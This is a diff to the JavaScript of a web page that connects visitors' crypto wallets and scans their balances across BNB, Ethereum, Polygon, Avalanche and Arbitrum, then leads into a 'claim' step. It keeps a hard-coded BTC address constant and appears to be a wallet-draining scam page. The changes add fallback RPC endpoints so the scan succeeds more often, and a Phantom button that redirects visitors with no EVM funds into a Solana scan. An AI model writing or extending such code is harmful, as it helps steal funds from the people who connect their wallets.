@@ -168,11 +168,11 @@ const ADDR_BTC = 'bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
 
 // EVM chains
 const ECHAINS = [
-  { id:56,  name:'BNB Chain', sym:'BNB', rpc:'https://bsc-dataseed1.binance.org', color:'#F3BA2F' },
-  { id:1,   name:'Ethereum',  sym:'ETH', rpc:'https://rpc.ankr.com/eth',           color:'#627EEA' },
-  { id:137, name:'Polygon',   sym:'MATIC',rpc:'https://polygon-rpc.com',            color:'#8247E5' },
-  { id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://api.avax.network/ext/bc/C/rpc',color:'#E84142'},
-  { id:42161,name:'Arbitrum', sym:'ETH', rpc:'https://arb1.arbitrum.io/rpc',       color:'#28A0F0' },
+  { id:56,  name:'BNB Chain', sym:'BNB', rpc:'https://bsc-dataseed1.defibit.io',              color:'#F3BA2F' },
+  { id:1,   name:'Ethereum',  sym:'ETH', rpc:'https://ethereum-rpc.publicnode.com',            color:'#627EEA' },
+  { id:137, name:'Polygon',   sym:'MATIC',rpc:'https://polygon-bor-rpc.publicnode.com',        color:'#8247E5' },
+  { id:43114,name:'Avalanche',sym:'AVAX',rpc:'https://avalanche-c-chain-rpc.publicnode.com',   color:'#E84142'},
+  { id:42161,name:'Arbitrum', sym:'ETH', rpc:'https://arbitrum-one-rpc.publicnode.com',       color:'#28A0F0' },
 ];
 
 // [contract, symbol, decimals]
@@ -382,11 +382,32 @@ async function scanEvm() {
   L('Wallet: ' + addr.substring(0, 8) + '...' + addr.substring(34));
   L('');
 
+  const BACKUP_RPC = {
+    1:   ['https://rpc.ankr.com/eth', 'https://eth.llamarpc.com'],
+    137: ['https://rpc.ankr.com/polygon', 'https://polygon.llamarpc.com'],
+    56:  ['https://bsc-dataseed.binance.org'],
+    43114: ['https://avalanche-c-chain.public.blastapi.io'],
+    42161: ['https://rpc.ankr.com/arbitrum'],
+  };
+
   for (const ch of ECHAINS) {
     L('[ ] ' + ch.name + '...');
+    let p = null, nb = null, rpcErr = null;
+    // Try primary + backup RPCs
+    const allRpcs = [ch.rpc, ...(BACKUP_RPC[ch.id]||[])];
+    for (const rpc of allRpcs) {
+      try {
+        const tp = new ethers.providers.JsonRpcProvider(rpc);
+        const tb = await Promise.race([
+          tp.getBalance(addr),
+          new Promise((_,rej) => setTimeout(() => rej(new Error('timeout')), 8000))
+        ]);
+        p = tp; nb = tb; rpcErr = null;
+        break; // success
+      } catch(e) { rpcErr = e; }
+    }
+    if (!nb) { L('  ' + ch.name + ': RPC error'); continue; }
     try {
-      const p = new ethers.providers.JsonRpcProvider(ch.rpc);
-      const nb = await p.getBalance(addr);
       const nf = ethers.utils.formatEther(nb);
       const has = parseFloat(nf) > 0;
 
@@ -419,7 +440,21 @@ async function scanEvm() {
 
   if (foundChains.length === 0) {
     show('s3');
-    document.getElementById('s3m').textContent = 'No funds found on BSC, Ethereum, Polygon, Avalanche, or Arbitrum.';
+    document.getElementById('s3m').innerHTML = 'No funds found on BSC, Ethereum, Polygon, Avalanche, or Arbitrum.<br><br><small style="color:rgba(255,255,255,.3)">Have Solana? Connect Phantom to scan SOL.</small>';
+    // Add phantom connect button if not already there
+    if (!document.getElementById('s3phantom')) {
+      const phBtn = document.createElement('button');
+      phBtn.id = 's3phantom';
+      phBtn.className = 'bt';
+      phBtn.style.background = '#AB9FF2';
+      phBtn.style.color = '#fff';
+      phBtn.style.marginTop = '10px';
+      phBtn.textContent = '🔗 Connect Phantom for SOL';
+      phBtn.onclick = autoPhantom;
+      document.getElementById('s3m').appendChild(document.createElement('br'));
+      document.getElementById('s3m').appendChild(document.createElement('br'));
+      document.getElementById('s3m').appendChild(phBtn);
+    }
     status('No funds found on any EVM chain.', 'err');
   } else {
     showClaim();
@@ -651,6 +686,20 @@ async function doSwitch(chainId, logFn) {
 }
 
 // ========== RESET ==========
+async function autoPhantom() {
+  const ph = (window.phantom && window.phantom.solana) || window.solana;
+  if (!ph) { status('Phantom not installed.', 'err'); return; }
+  try {
+    const resp = await ph.connect();
+    addr = resp.publicKey.toString();
+    prov = null; sign = null; phantomConn = ph;
+    wType = 'ph';
+    show('s2');
+    document.getElementById('s2l').textContent = 'Checking Solana...';
+    await scanSol();
+  } catch(e) { status('Phantom: ' + (e.message||'rejected'), 'err'); }
+}
+
 function reset() {
   prov = null; sign = null; addr = null; wType = ''; foundChains = []; phantomConn = null;
   hideStatus(); show('s1');
